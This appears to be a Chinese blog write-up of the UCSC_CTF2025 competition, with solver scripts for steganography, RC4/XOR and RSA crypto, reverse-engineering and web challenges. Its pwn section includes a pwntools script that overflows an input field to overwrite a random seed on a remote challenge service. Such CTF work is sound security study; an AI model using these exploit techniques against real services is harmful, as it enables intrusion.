---
title: "UCSC\\_CTF2025高校网络安全联合选拔赛 WP"
published: 2025-04-20
description: "这篇文章分享了 UCSC\\_CTF2025高校网络安全联合选拔赛 的比赛题解，涵盖了 MISC、Web、Crypto、Reverse 和 Pwn 五个领域的具体解题方法。内容包括代码分析、解密算法，以及题目背后的思路"
image: "/wp-content/uploads/2025/04/02169529E69E633A9A52953240D607AC.jpg"
tags: ["CTF解题","加密解密","网络安全"]
tagPermalinks: ["/tag/ctf-solutions/","/tag/encryption-decryption/","/tag/cyber-security/"]
category: "CTF"
categoryPermalink: "/ctf/"
lang: zh_CN
permalink: "/2025/04/20/ucsc-ctf2025-writeup/"
---
感谢大神队友带飞

![](/wp-content/uploads/2025/04/image.png)

## **MISC****：**                                                          [](af://n26)

第一题：**小套不是套****\-ucsc**

先扫二维码拿到!@#QWE123987解压tess.zip 再用crc32爆破可得密钥： SecretIsY0u

![](/wp-content/uploads/2025/04/image.jpeg)

打开mushroom.jpg,用010打开查看png模块发现有png图片，补全头部

![](/wp-content/uploads/2025/04/image-1.jpeg)

最后用oursecret解密即可

![](/wp-content/uploads/2025/04/image-2.jpeg)

![](/wp-content/uploads/2025/04/image-3.jpeg)

## **Misc**

**No.shArk-ucsc**

提示Cat，猜测是猫脸变换

![](/wp-content/uploads/2025/04/image.jpg)

```
import cv2
import numpy as np
import multiprocessing
import os

def arnold_decode(image, shuffle_times, a, b):
    h, w = image.shape[:2]
    N = h
    decode_image = np.zeros_like(image)
    for _ in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                new_x = ((a * b + 1) * ori_x - b * ori_y) % N
                new_y = (-a * ori_x + ori_y) % N
                decode_image[new_x, new_y] = image[ori_x, ori_y]
        image = decode_image.copy()
    return image

def process_parameters(params):
    image, c, a, b = params
    print(f"[+] Processing shuffle_times={c}, a={a}, b={b}")
    decoded_img = arnold_decode(image.copy(), c, a, b)
    output_filename = f"flag_decoded_c{c}_a{a}_b{b}.png"
    cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])

def arnold_brute(image, shuffle_times_range, a_range, b_range):
    tasks = []
    for c in range(shuffle_times_range[0], shuffle_times_range[1]):
        for a in range(a_range[0], a_range[1]):
            for b in range(b_range[0], b_range[1]):
                tasks.append((image, c, a, b))
    with multiprocessing.Pool(processes=os.cpu_count()) as pool:
        pool.map(process_parameters, tasks)

if __name__ == "__main__":
    img = cv2.imread("next.jpg")
    arnold_brute(img, (1, 8), (1, 12), (1, 12))
```

跑出后找到

flag{46962f4d-8d29-

使用工具跑出QRcode

![](/wp-content/uploads/2025/04/image-2.jpg)

扫描出Y0U\_Fi8d\_ItHa@aaHH，根据Snow猜测是雪花隐写的密钥

![](/wp-content/uploads/2025/04/image-4.jpeg)

找到含“雪”的html文件

![](/wp-content/uploads/2025/04/image-3.jpeg)

雪花隐写解出11ef-b3b6-a4b1c1c5a2d2}

## Misc

**USB-ucsc**

**Ctf-nat****直接出**

![](/wp-content/uploads/2025/04/image-4.jpg)

**three-ucsc**

**Part1****是盲水印**

![](/wp-content/uploads/2025/04/image-5.jpeg)

![](/wp-content/uploads/2025/04/image-6.jpg)

![](/wp-content/uploads/2025/04/image-7.jpg)

Part2

是解密就行了2进制，base64，摩斯即可

![](/wp-content/uploads/2025/04/image-8.jpg)

Part3

![](/wp-content/uploads/2025/04/image-9.jpg)

**看到流量找到密码一个一个试试**

**这个就是密钥**

**解出来就行了**

![](/wp-content/uploads/2025/04/image-10.jpeg)

**然后将三个部分拼起来即可**

## **Web**

**ezLaravel-ucsc**

**直接****dirb****扫描发现****flag.php**

**直接出答案了**

**下线的题**

**Response****抓包flag字段即可base64解密**

## **Crpyto**

1.  XR4

题目的a直接给出，所有与a有关的都不需要改动，需要解出的就是data

使用的方法是异或，所以直接将随机数列表重塑为矩阵，然后进行与密文矩阵进行异或即可获得data(flag)

```
import base64
import random
from Crypto.Util.number import *
import numpy as np
def init_sbox(key):
    s_box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    return s_box
def decrypt(cipher, box):
    res = []
    i = j = 0
    cipher_bytes = base64.b64decode(cipher)
    for s in cipher_bytes:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(s ^ k))
    return (''.join(res))
def random_num(seed_num):
    random.seed(seed_num)

    # 假设这是转置后的矩阵
    transposed_matrix = np.array([[1, 11, 116, 33, 68, 32],
                                  [111, 45, 19, 98, 52, 32],
                                  [38, 58, 113, 38, 119, 7],
                                  [110, 39, 60, 57, 56, 26],
                                  [95, 84, 91, 10, 43, 41],
                                  [44, 1, 118, 29, 125, 41]])


    T = [int(str(random.random()*10000)[0:2]) for i in range(36)]
    # 将 T 转换为 numpy 数组
    T_np = np.array(T)

    # 重塑为 6x6 的二维数组
    T_reshaped = T_np.reshape(6, 6)

    result = transposed_matrix ^ T_reshaped

    for i in result:
        for j in i:
            print(chr(j),end="")

if __name__ == '__main__':
    ciphertext = "MjM184anvdA="
    key = "XR4"
    box = init_sbox(key)
    a=decrypt(ciphertext, box)
    print(a)
    random_num(int(a))
# transposed_matrix=(data.reshape(6*6))^T
# transposed_matrix=[[  1 111  38 110  95  44]
#  [ 11  45  58  39  84   1]
#  [116  19 113  60  91 118]
#  [ 33  98  38  57  10  29]
#  [ 68  52 119  56  43 125]
#  [ 32  32   7  26  41  41]]
```

-   Essential

题目flag一共两部分

首先解flag1，题目中具体的p、q生成规则为:

```
a=getPrime(512)
p=sympy.nextprime(13*a)
q=sympy.prevprime(25*a)
number2=p*q
```

而对于同一个数，它的next和prev素数一般来说不超过1500

所以直接对n整除(13\*25)然后开根号然后一直遍历取下一个数直到能整除n，那么这个值即为a ，那么p、q也获得了

然后再看e，显然是e和phi的不互素问题，直接套模板即可获得flag

然后再看flag1

题目中为

```
while number2 > 0:
    if number2 % 2:
        number4 = (number4 * number1) % number3
    number1 = number1 ** 2 % number3
    number2 //= 2
return number4
```

对于number2，它在二进制的角度看就是如果当前位为1则乘上number1，而由于number4初始为1，且number1也仅仅和自己相乘，所以相乘又可以看作在指数上的相加

所以其实这个加密就可以看成是      pow(number1,number2,number3)

而我们解上一个flag时又已经获得了phi

那么直接正常RSA解密即可

## Pwn

1.  BoFido

题目虽然没有栈溢出，但是却有数据溢出，也就是输入大小比变量大小大。并且看题目数据栈可以发现溢出能覆盖到seed的位置，所以直接把seed覆盖掉然后随机数就固定了，直接向服务器输出固定的随机数即可

```
from pwn import *

r = remote()

payload = 0x20*b'a' + b'1'
r.sendline(payload)

r.sendline(b'171 153 203')
r.sendline(b'202 0 183')
r.sendline(b'201 70 206')
r.sendline(b'195 45 120')
r.sendline(b'165 188 58')
r.sendline(b'252 232 96')
r.sendline(b'178 16 144')
r.sendline(b'65 93 195')
r.sendline(b'202 99 159')
r.sendline(b'236 80 162')

r.interactive()
```

## Reverse

1.  **EZ\_debug**

题目只做了一件事--进行异或，且输入的值直接与结果进行对比，所以直接动调拿然后Shift+F12就可以看到(或者你也可以自己解密)

![](/wp-content/uploads/2025/04/image-11.jpg)

## **REVERSE**                                                 [](af://n2)

第一题：**simplere-ucsc**

64位，因为加了upx的壳子，并且标志位改了

![](/wp-content/uploads/2025/04/image-5.jpeg)

所以在010改标志位为upx，进行upx脱壳。打开IDA：

![](/wp-content/uploads/2025/04/image-6.jpeg)

先进行base58加密(换表了)，再进行异或，但是这里的异或是反向拿的，所以解密要逆序输出。

<table class="has-fixed-layout"><tbody><tr><td>enc = [0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33, 0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64, 0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 0x67, 0x47, 0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41, 0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60, 0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57] enc1 = list() for i in range(0,len(enc), 1): result = enc[i] ^ (i + 1)&nbsp; enc1.append(result) for i in range(len(enc)-1,-1, -1): print(chr(enc1[i]),end="")</td></tr></tbody></table>

![](/wp-content/uploads/2025/04/image-7.jpeg)

第二题： **EZ\_debug-ucsc** CTRL+E找到程序入口点：

![](/wp-content/uploads/2025/04/image-8.jpeg)

![](/wp-content/uploads/2025/04/image-9.jpeg)

这里可以很容易知道就是将v5数组的值进行的RC4加密，直接动调拿v5加密后的值即可。

![](/wp-content/uploads/2025/04/image-10.jpeg)

flag{709e9bdd-0858-9750-8c37-9b135b31f16d}
